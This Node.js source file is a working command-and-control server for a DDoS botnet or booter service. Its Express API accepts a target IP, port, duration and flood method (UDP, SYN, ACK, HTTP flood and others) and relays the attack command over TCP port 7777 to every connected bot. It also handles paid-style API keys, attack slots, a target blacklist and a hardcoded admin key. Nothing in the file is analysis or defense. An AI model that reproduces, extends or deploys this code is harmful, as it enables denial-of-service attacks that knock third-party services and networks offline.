const express = require('express');
const net = require('net');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 5000;
const SERVER_IP = 'youreserverip'; 
const clients = []; 
let activeAttacks = 0;
const MAX_SLOTS = 1; 
const ADMIN_KEY = "eralpomarov1337"; 

let attacksEnabled = true; 
app.set('trust proxy', true); 
let currentAttack = null; 

const keysPath = path.join(__dirname, 'keys.json');
const blacklistPath = path.join(__dirname, 'blacklist.json');

let API_KEYS = [];
try {
  if (fs.existsSync(keysPath)) {
    const keysData = fs.readFileSync(keysPath, 'utf8');
    if (keysData && keysData.trim() !== '') {
      API_KEYS = JSON.parse(keysData);
    }
  } else {
    fs.writeFileSync(keysPath, JSON.stringify([], null, 2));
    console.log('Created empty keys.json');
  }
} catch (error) {
  console.error('Error handling API keys:', error);
  API_KEYS = [];
}

let BLACKLIST = [];
try {
  if (fs.existsSync(blacklistPath)) {
    const blacklistData = fs.readFileSync(blacklistPath, 'utf8');
    if (blacklistData && blacklistData.trim() !== '') {
      BLACKLIST = JSON.parse(blacklistData);
    }
  } else {
    fs.writeFileSync(blacklistPath, JSON.stringify([], null, 2));
    console.log('Created empty blacklist.json');
  }
} catch (error) {
  console.error('Error handling blacklist:', error);
  BLACKLIST = [];
}

function saveApiKeys() {
  try {
    fs.writeFileSync(keysPath, JSON.stringify(API_KEYS, null, 2));
    return true;
  } catch (error) {
    console.error('Error saving API keys:', error);
    return false;
  }
}
function saveBlacklist() {
  try {
    fs.writeFileSync(blacklistPath, JSON.stringify(BLACKLIST, null, 2));
    return true;
  } catch (error) {
    console.error('Error saving blacklist:', error);
    return false;
  }
}

app.use(bodyParser.json());

function isValidIP(ip) {
  const ipPattern = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/;
  if (!ipPattern.test(ip)) return false;
  return ip.split('.').every(part => parseInt(part) >= 0 && parseInt(part) <= 255);
}
function isValidPort(port) {
  const portNum = parseInt(port);
  return !isNaN(portNum) && portNum >= 1 && portNum <= 65535;
}
function isBlacklisted(ip) {
  return BLACKLIST.includes(ip);
}

function cleanupClients() {
  const now = new Date();
  const timeoutMs = 30000;
  clients.forEach((client, index) => {
    if (!client.socket.writable || (now - client.lastActivity) > timeoutMs) {
      console.log(`Cleaning up inactive client: ${client.ip}`);
      client.socket.destroy();
      clients.splice(index, 1);
    }
  });
}
const handleClient = (clientSocket) => {
  const clientIP = clientSocket.remoteAddress?.replace(/^.*:/, '') || 'unknown';
  if (isBlacklisted(clientIP)) {
    console.log(`Rejected connection from blacklisted IP: ${clientIP}`);
    clientSocket.destroy();
    return;
  }
  const clientInfo = { socket: clientSocket, ip: clientIP, connectedAt: new Date(), lastActivity: new Date() };
  clients.push(clientInfo);
  console.log(`New connection established from ${clientIP}`);
  clientSocket.on('data', () => { clientInfo.lastActivity = new Date(); });
  clientSocket.on('error', (err) => { console.error(`Socket error from ${clientIP}: ${err.message}`); clientSocket.destroy(); });
  clientSocket.on('close', () => {
    const index = clients.findIndex(c => c.socket === clientSocket);
    if (index !== -1) { clients.splice(index, 1); console.log(`Client ${clientIP} disconnected`); }
  });
};


app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

app.get('/users', (req, res) => {
    const apiKey = req.query.api;
    if (apiKey === ADMIN_KEY || API_KEYS.includes(apiKey)) {
        const clientList = clients.map(c => ({ ip: c.ip, connectedAt: c.connectedAt, lastActivity: c.lastActivity }));
        return res.status(200).json({ total: clients.length, clients: clientList });
    } else {
        return res.status(401).json({ message: 'Invalid API key!' });
    }
});

app.get('/status', (req, res) => {
    if (req.query.api !== ADMIN_KEY) {
        return res.status(401).json({ message: 'Unauthorized. Admin access required.' });
    }
    if (!currentAttack) {
        return res.status(200).json({ active: false, attacks_enabled: attacksEnabled, message: 'No active attacks' });
    }
    const now = new Date();
    const elapsedMs = now - currentAttack.startTime;
    const remainingSeconds = Math.max(0, Math.floor((currentAttack.durationMs - elapsedMs) / 1000));
    return res.status(200).json({
        active: activeAttacks > 0,
        attacks_enabled: attacksEnabled,
        target: currentAttack.ip,
        port: currentAttack.port,
        method: currentAttack.method,
        remainingTime: `${remainingSeconds} seconds`,
        initiatedByIp: currentAttack.initiatedByIp
    });
});

app.get('/attack', (req, res) => {
    try {
        if (!attacksEnabled) {
            return res.status(503).json({ message: 'Attack functionality is currently disabled.' });
        }
        const { api: apiKey, ip, port, threads, method, duration } = req.query;

        if (apiKey !== ADMIN_KEY && !API_KEYS.includes(apiKey)) {
            return res.status(401).json({ message: 'Invalid API key!' });
        }
        if (activeAttacks >= MAX_SLOTS) {
            return res.status(429).json({ message: 'No available attack slots.' });
        }

        const validMethods = ['udp', 'tcp', 'syn', 'http-flood', 'synflood', 'ack', 'ssh', 'hex', 'synack', 'psch'];
        if (!validMethods.includes(method)) return res.status(400).json({ message: 'Invalid method.' });
        
        const durationNum = parseInt(duration);
        if (isNaN(durationNum) || durationNum < 30 || durationNum > 120) return res.status(400).json({ message: 'Duration must be between 30 and 120s.' });
        if ((method !== 'http-flood') && !isValidIP(ip)) return res.status(400).json({ message: 'Invalid IP address.' });
        if (!isValidPort(port)) return res.status(400).json({ message: 'Invalid port number.' });
        if (isBlacklisted(ip)) return res.status(403).json({ message: 'Target IP is blacklisted.' });

        activeAttacks++;
        currentAttack = {
            ip, port, method,
            duration: durationNum,
            durationMs: durationNum * 1000,
            startTime: new Date(),
            initiatedByIp: req.ip 
        };
        const attackMessage = `${ip} ${port} ${threads || 1} ${method} ${duration}\n`;
        
        cleanupClients();
        clients.forEach(client => {
            if (client.socket.writable) client.socket.write(attackMessage);
        });

        console.log(`Attack command sent: ${attackMessage}`);
        setTimeout(() => {
            activeAttacks--;
            if (activeAttacks === 0) currentAttack = null;
        }, durationNum * 1000);

        return res.status(200).json({ message: 'Attack command sent to all clients.' });
    } catch (error) {
        console.error('Attack API error:', error);
        return res.status(500).json({ error: 'Internal server error.' });
    }
});



app.get('/admin/attacks/enable', (req, res) => {
    if (req.query.admin !== ADMIN_KEY) return res.status(401).json({ message: 'Unauthorized.' });
    attacksEnabled = true;
    res.status(200).json({ message: 'Attack functionality has been enabled.' });
});
app.get('/admin/attacks/disable', (req, res) => {
    if (req.query.admin !== ADMIN_KEY) return res.status(401).json({ message: 'Unauthorized.' });
    attacksEnabled = false;
    res.status(200).json({ message: 'Attack functionality has been disabled.' });
});

app.get('/keys', (req, res) => {
    if (req.query.admin !== ADMIN_KEY) return res.status(401).json({ message: 'Unauthorized.' });
    res.status(200).json({ total: API_KEYS.length, keys: API_KEYS });
});
app.get('/addkey', (req, res) => {
    const { admin, key } = req.query;
    if (admin !== ADMIN_KEY) return res.status(401).json({ message: 'Unauthorized.' });
    if (!key || key.trim() === '') return res.status(400).json({ message: 'Key cannot be empty.' });
    if (API_KEYS.includes(key) || key === ADMIN_KEY) return res.status(400).json({ message: 'Key already exists.' });
    API_KEYS.push(key);
    saveApiKeys() ? res.status(200).json({ message: `Key '${key}' added.` }) : res.status(500).json({ message: 'Failed to save key.' });
});
app.get('/removekey', (req, res) => {
    const { admin, key } = req.query;
    if (admin !== ADMIN_KEY) return res.status(401).json({ message: 'Unauthorized.' });
    if (!key) return res.status(400).json({ message: 'Key cannot be empty.' });
    if (key === ADMIN_KEY) return res.status(400).json({ message: 'Cannot remove admin key.' });
    const initialLength = API_KEYS.length;
    API_KEYS = API_KEYS.filter(k => k !== key);
    if (API_KEYS.length === initialLength) return res.status(404).json({ message: 'Key not found.' });
    saveApiKeys() ? res.status(200).json({ message: `Key '${key}' removed.` }) : res.status(500).json({ message: 'Failed to remove key.' });
});

app.get('/blacklist', (req, res) => {
    if (req.query.admin !== ADMIN_KEY) return res.status(401).json({ message: 'Unauthorized.' });
    res.status(200).json({ total: BLACKLIST.length, ips: BLACKLIST });
});
app.get('/blacklist/add', (req, res) => {
    const { admin, ip } = req.query;
    if (admin !== ADMIN_KEY) return res.status(401).json({ message: 'Unauthorized.' });
    if (!ip || !isValidIP(ip)) return res.status(400).json({ message: 'Invalid IP address format.' });
    if (BLACKLIST.includes(ip)) return res.status(400).json({ message: 'IP already in blacklist.' });
    BLACKLIST.push(ip);
    clients.forEach(c => { if (c.ip === ip) c.socket.destroy(); });
    saveBlacklist() ? res.status(200).json({ message: `IP ${ip} added to blacklist.` }) : res.status(500).json({ message: 'Failed to save blacklist.' });
});
app.get('/blacklist/remove', (req, res) => {
    const { admin, ip } = req.query;
    if (admin !== ADMIN_KEY) return res.status(401).json({ message: 'Unauthorized.' });
    if (!ip) return res.status(400).json({ message: 'IP cannot be empty.' });
    const initialLength = BLACKLIST.length;
    BLACKLIST = BLACKLIST.filter(bIp => bIp !== ip);
    if (BLACKLIST.length === initialLength) return res.status(404).json({ message: 'IP not found in blacklist.' });
    saveBlacklist() ? res.status(200).json({ message: `IP ${ip} removed from blacklist.` }) : res.status(500).json({ message: 'Failed to save blacklist.' });
});
app.get('/blacklist/clear', (req, res) => {
    if (req.query.admin !== ADMIN_KEY) return res.status(401).json({ message: 'Unauthorized.' });
    BLACKLIST = [];
    saveBlacklist() ? res.status(200).json({ message: 'Blacklist cleared.' }) : res.status(500).json({ message: 'Failed to clear blacklist.' });
});
app.get('/blacklist/check', (req, res) => {
    const { api, ip } = req.query;
    if (api !== ADMIN_KEY && !API_KEYS.includes(api)) return res.status(401).json({ message: 'Invalid API key!' });
    if (!ip || !isValidIP(ip)) return res.status(400).json({ message: 'Invalid IP address format.' });
    res.status(200).json({ ip: ip, blacklisted: BLACKLIST.includes(ip) });
});


setInterval(cleanupClients, 10000);

const server = net.createServer(handleClient);
server.on('error', (err) => { console.error('TCP Server error:', err); });
server.listen(7777, SERVER_IP, () => {
    console.log(`TCP bot server is running on ${SERVER_IP}:7777`);
});

app.listen(PORT, SERVER_IP, () => {
    console.log(`API is running on http://${SERVER_IP}:${PORT}`);
    console.log(`Admin Panel available at http://${SERVER_IP}:${PORT}/admin`);
});